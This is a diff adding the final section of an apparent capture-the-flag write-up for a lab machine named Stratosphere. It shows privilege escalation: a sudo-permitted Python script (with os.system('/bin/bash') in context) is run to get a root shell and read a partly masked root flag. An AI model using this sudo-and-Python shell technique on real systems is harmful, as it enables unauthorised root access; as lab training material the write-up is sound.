@@ -757,3 +757,24 @@ os.system('/bin/bash')
 ```
 
 <br />
+
+Once created we apply execute permissions and run the test.py script to get root:
+
+<br />
+
+```bash
+richard@stratosphere:~$ sudo /usr/bin/python3 /home/richard/test.py
+root@stratosphere:/home/richard# whoami
+root
+root@stratosphere:/home/richard# cd /root
+root@stratosphere:~# cat root.txt
+46ced40dd35493ea8eca404547xxxxxx
+```
+
+<br />
+
+Machine rooted!!!
+
+I learn a lot with this machine, hope that you to :D.
+
+Keep hacking!!❤️❤️
